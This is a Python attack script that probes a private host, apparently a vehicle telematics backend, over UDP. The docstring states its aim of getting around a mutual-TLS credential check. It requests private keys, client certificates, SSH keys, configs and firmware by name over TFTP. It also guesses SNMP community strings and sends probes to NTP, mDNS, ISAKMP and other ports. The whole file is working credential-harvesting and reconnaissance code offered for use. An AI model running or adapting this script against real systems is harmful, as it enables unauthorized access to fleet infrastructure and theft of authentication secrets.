#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""UDP surface probe for 10.230.164.3.

The TCP surface is only 8080/8443, and the mTLS wall at 8443 needs a
vehicle-side credential. One classic no-auth delivery channel is still
unchecked: TFTP (69/udp) handing out the engineering package, plus SNMP
(161/udp) leaking a path or a cert. Send one datagram per (port, payload),
listen 2s, print whatever comes back.
"""
import socket
import struct
import sys

HOST = "10.230.164.3"

TFTP_FILES = [
    "client.pem", "client.crt", "client.key", "tbox.pem", "tbox.crt", "tbox.key",
    "fleet.pem", "fleet.crt", "ca.pem", "ca.crt", "root.pem", "root.crt",
    "client.p12", "tbox.p12", "fleet.p12", "client.pfx", "diag.pem", "diag.p12",
    "diagnostics.pem", "operator.pem", "technician.pem", "id_ecdsa", "id_rsa",
    "config", "config.yaml", "config.json", "startup-config", "running-config",
    "firmware.bin", "package.zip", "pkg.tar.gz", "tbox.cfg", "cv6.pem", "cv6.p12",
]


def tftp_rrq(fn):
    return struct.pack("!H", 1) + fn.encode() + b"\x00octet\x00"


def tftp_wrq(fn):
    return struct.pack("!H", 2) + fn.encode() + b"\x00octet\x00"


# minimal BER for SNMPv2c GetRequest: sysDescr.0 / sysName.0 / sysContact.0
def _tlv(tag, payload):
    if len(payload) < 128:
        return bytes([tag, len(payload)]) + payload
    n = len(payload)
    ln = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([tag, 0x80 | len(ln)]) + ln + payload


def _int(v):
    return _tlv(0x02, v.to_bytes(1, "big") if v < 128 else v.to_bytes(2, "big"))


def _oid(dotted):
    parts = [int(x) for x in dotted.split(".")]
    out = bytes([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        if p < 128:
            out += bytes([p])
        else:
            chunk = [p & 0x7F]
            p >>= 7
            while p:
                chunk.append((p & 0x7F) | 0x80)
                p >>= 7
            out += bytes(reversed(chunk))
    return _tlv(0x06, out)


def snmp_get(community, oids):
    vbs = b""
    for o in oids:
        vbs += _tlv(0x30, _oid(o) + _tlv(0x05, b""))
    pdu = _tlv(0xA0, _int(0x1234) + _int(0) + _int(0) + _tlv(0x30, vbs))
    return _tlv(0x30, _int(1) + _tlv(0x04, community.encode()) + pdu)


def probe(port, payload, label, timeout=2.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(payload, (HOST, port))
        data, addr = s.recvfrom(4096)
        print("[REPLY] %s -> %s:%d %d bytes: %r" % (label, addr[0], addr[1], len(data), data[:200]))
        return data
    except socket.timeout:
        print("[none ] %s (timeout %.1fs)" % (label, timeout))
    except Exception as e:
        print("[err  ] %s %s: %s" % (label, type(e).__name__, e))
    finally:
        s.close()
    return None


def main():
    print("### TFTP RRQ to %s:69 (%d filenames)" % (HOST, len(TFTP_FILES)))
    hits = 0
    for fn in TFTP_FILES:
        r = probe(69, tftp_rrq(fn), "tftp RRQ %s" % fn, timeout=1.5)
        if r:
            hits += 1
    print("tftp replies: %d/%d" % (hits, len(TFTP_FILES)))

    print("\n### SNMP v2c to %s:161" % HOST)
    for c in ("public", "private", "cybercar", "cv6", "tbox"):
        probe(161, snmp_get(c, ["1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.5.0"]),
              "snmp v2c community=%s" % c, timeout=2.0)

    print("\n### misc UDP ports")
    for port, payload, label in [
        (123, b"\x1b" + b"\x00" * 47, "ntp v3 client"),
        (5353, b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04tbox\x00\x00\x01\x00\x01",
         "mdns A tbox"),
        (500, b"\x00" * 64, "isakmp garbage"),
        (9999, b"\n", "udp 9999 newline"),
        (9998, b"\n", "udp 9998 newline"),
    ]:
        probe(port, payload, label, timeout=1.5)


if __name__ == "__main__":
    main()
